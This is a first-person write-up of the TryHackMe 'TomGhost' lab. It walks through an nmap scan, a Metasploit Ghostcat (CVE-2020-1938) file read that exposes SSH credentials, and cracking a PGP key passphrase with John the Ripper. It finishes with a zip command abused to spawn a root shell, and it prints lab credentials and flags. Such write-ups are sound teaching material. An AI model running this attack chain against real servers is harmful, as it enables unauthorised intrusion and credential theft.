# TomGhost Write‑up

## Getting the Target IP

First I started the machine in TryHackMe and got the target IP:

```
10.130.161.77
```

Then I checked the connectivity using `ping`:

```bash
ping 10.130.161.77
```

The machine responded, which means the connection was working.

---

## Scanning the Target

Next I scanned the machine using **nmap** to find open ports and services.

```bash
nmap -sV 10.130.161.77
```

Output:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu
53/tcp   open  tcpwrapped
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 9.0.30
```

From this scan I noticed:

- Port **22 → SSH**
    
- Port **8080 → Apache Tomcat**
    
- Port **8009 → AJP (Apache Jserv Protocol)**
    

The **Apache Tomcat version is 9.0.30**.

---

## Searching for Vulnerabilities

Since the machine is running **Apache Tomcat 9.0.30**, I searched on Google for vulnerabilities.

I found this exploit:

**Apache Tomcat – AJP Ghostcat File Read**

- CVE: **CVE-2020-1938**
    
- Exploit: Ghostcat
    
- Source: Exploit‑DB
    

This vulnerability allows attackers to **read files from the server through the AJP port (8009)**.

---

## Exploiting Ghostcat with Metasploit

I opened **Metasploit**:

```bash
msfconsole
```

Then I searched for the exploit:

```
search ghostcat
```

Result:

```
auxiliary/admin/http/tomcat_ghostcat
```

I selected the module:

```
use 0
```

Then I checked the options:

```
show options
```

I set the target IP:

```
set rhosts 10.130.161.77
```

Then I ran the exploit:

```
exploit
```

The exploit successfully read a file from the server and I found credentials inside the output:

```
skyfuck:8730281lkjlkjdqlksalks
```

---

## Logging in Using SSH

I used the credentials to connect using SSH.

```bash
ssh skyfuck@10.130.161.77
```

After entering the password, I successfully logged in.

---

## Finding the User Flag

Inside the system I checked the files:

```bash
ls
```

Output:

```
credential.pgp
tryhackme.asc
```

Then I looked at the other user's home directory:

```bash
ls /home
```

Output:

```
merlin
skyfuck
```

Inside **merlin's directory** I found the user flag:

```bash
cat /home/merlin/user.txt
```

Flag:

```
THM{GhostCat_1s_so_cr4sy}
```

---

## Investigating PGP Files

In the `skyfuck` home directory I found two files:

```
credential.pgp
tryhackme.asc
```

After searching online I learned that:

- `.pgp` → encrypted file
    
- `.asc` → PGP private key
    

To analyze them I copied the files to my local machine.

---

## Copying Files to My Local Machine

I used **scp** to download the files:

```bash
scp -r skyfuck@10.130.161.77:/home/skyfuck /home/hamza/Desktop/THM
```

Now I had the files locally:

```
credential.pgp
tryhackme.asc
```

---

## Cracking the PGP Key

The `.asc` file contains a **PGP private key**, so I tried to crack its passphrase using **John the Ripper**.

First I converted the key to a crackable format:

```bash
gpg2john tryhackme.asc > hash.txt
```

Then I ran john:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

John cracked the password.

---

## Decrypting the Credentials

After getting the password, I used it to decrypt the encrypted file:

```bash
gpg --decrypt credential.pgp
```

This revealed **credentials for the user `merlin`**.

---

## Switching to Merlin

I switched to the `merlin` user using the password obtained.

Now I had access to the `merlin` account.

---

## Privilege Escalation

While exploring the system I found that the **zip command could be abused to execute commands**.

I used the following command:

```bash
zip test.zip /etc/hosts -T -TT '/bin/sh #'
```

This trick executed a shell with higher privileges.

---

## Getting Root Access

After executing the exploit I was able to access the root directory.

Then I read the root flag:

```bash
cat /root/root.txt
```

Flag:

```
THM{Z1P_1S_FAKE}
```

---

## Conclusion

In this machine I:

1. Scanned the target with **nmap**
    
2. Found **Apache Tomcat running**
    
3. Exploited **Ghostcat (CVE‑2020‑1938)**
    
4. Retrieved **SSH credentials**
    
5. Logged into the machine
    
6. Cracked a **PGP private key**
    
7. Decrypted credentials for another user
    
8. Abused the **zip command for privilege escalation**
    
9. Retrieved the **root flag**
    

---

**User Flag**

```
THM{GhostCat_1s_so_cr4sy}
```

**Root Flag**

```
THM{Z1P_1S_FAKE}
```